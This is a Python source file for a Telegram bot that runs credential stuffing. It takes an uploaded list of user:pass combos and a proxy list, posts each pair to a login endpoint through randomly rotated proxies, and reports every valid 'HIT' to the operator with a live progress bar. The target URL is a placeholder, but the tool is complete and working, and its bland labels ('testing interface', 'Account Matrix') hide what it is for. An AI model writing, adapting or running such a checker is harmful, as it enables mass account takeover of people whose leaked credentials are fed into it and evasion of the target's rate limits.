import os
import random
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import httpx

# Setup application logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Retrieve authentication configurations securely from environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN")
ALLOWED_ID_STR = os.getenv("ALLOWED_CHAT_ID", "0")
ALLOWED_ID = int(ALLOWED_ID_STR) if ALLOWED_ID_STR.isdigit() else 0

# Global runtime memory bank to hold rotated proxies
PROXIES = []

def check_account_against_target(username, password, proxy=None):
    """
    Simulates the core checking configuration block.
    Modify this function's parameters to target your specific testing interface.
    """
    url = "https://example.com/api/login"  # Replace with target authorization endpoint
    headers = {
        "User-Agent": "Mozilla/5.0 (Android; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0",
        "Content-Type": "application/json"
    }
    payload = {
        "user": username,
        "pass": password
    }
    
    transport = None
    if proxy:
        # Standard format translation for network requests
        proxy_url = f"http://{proxy}"
        transport = httpx.HTTPTransport(proxy=proxy_url)

    try:
        with httpx.Client(transport=transport, timeout=6.0) as client:
            response = client.post(url, json=payload, headers=headers)
            
            # Key Check rule validation
            if "success" in response.text or response.status_code == 200:
                return "HIT"
            elif "invalid" in response.text or response.status_code == 401:
                return "BAD"
            else:
                return "RETRY"
    except Exception:
        return "RETRY"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_ID: 
        return
    await update.message.reply_text(
        "👋 **Custom Account Matrix Active**\n\n"
        "1️⃣ First, send your `proxies.txt` file (Format: ip:port).\n"
        "2️⃣ Next, send your `combo.txt` file (Format: user:pass) to launch the task loop."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_ID: 
        return
    global PROXIES

    file_name = update.message.document.file_name.lower()
    file = await update.message.document.get_file()

    # Handle incoming operational proxies
    if "proxy" in file_name or "proxies" in file_name:
        proxy_path = "proxies.txt"
        await file.download_to_drive(proxy_path)
        with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
            PROXIES = [line.strip() for line in f.readlines() if line.strip()]
        await update.message.reply_text(f"📡 **Network Buffer Configured**: Loaded {len(PROXIES)} proxies successfully.")
        return

    # Handle incoming credential combos
    if "combo" in file_name or file_name.endswith(".txt"):
        combo_path = "combo.txt"
        await file.download_to_drive(combo_path)
        
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f.readlines() if ":" in line]

        total_accounts = len(lines)
        if total_accounts == 0:
            await update.message.reply_text("❌ Data Parsing Error: No standard user:pass formats identified.")
            return

        progress_msg = await update.message.reply_text("⏳ Initializing process execution matrix...")
        hits, bad, checked = 0, 0, 0

        for line in lines:
            username, password = line.split(":", 1)
            current_proxy = random.choice(PROXIES) if PROXIES else None
            
            result = check_account_against_target(username, password, proxy=current_proxy)
            
            if result == "HIT":
                hits += 1
                await update.message.reply_text(f"🎯 **HIT DETECTED** 🎯\nAccount: `{line}`", parse_mode="Markdown")
            elif result == "BAD" or result == "RETRY":
                bad += 1

            checked += 1

            # Throttled live-editing UI loop (Updates every 5 checks to prevent Telegram API spam)
            if checked % 5 == 0 or checked == total_accounts:
                percentage = int((checked / total_accounts) * 100)
                bar = "█" * (percentage // 10) + "░" * (10 - (percentage // 10))
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=progress_msg.message_id,
                        text=f"🔄 **Live Progress Matrix**\nProgress: `[{bar}] {percentage}%`\nProcessed: {checked}/{total_accounts}\n🎯 Hits: {hits} | ❌ Failed: {bad}\n📡 Active Proxies: {len(PROXIES)}",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

        await update.message.reply_text(f"🏁 **Execution Loop Completed**\nTotal Checked: {total_accounts}\nSuccessful Hits: {hits}")

def main():
    if not TOKEN:
        print("Fatal Error: TELEGRAM_TOKEN variable missing from the deployment platform environment.")
        return
        
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.run_polling()

if __name__ == '__main__':
    main()
  
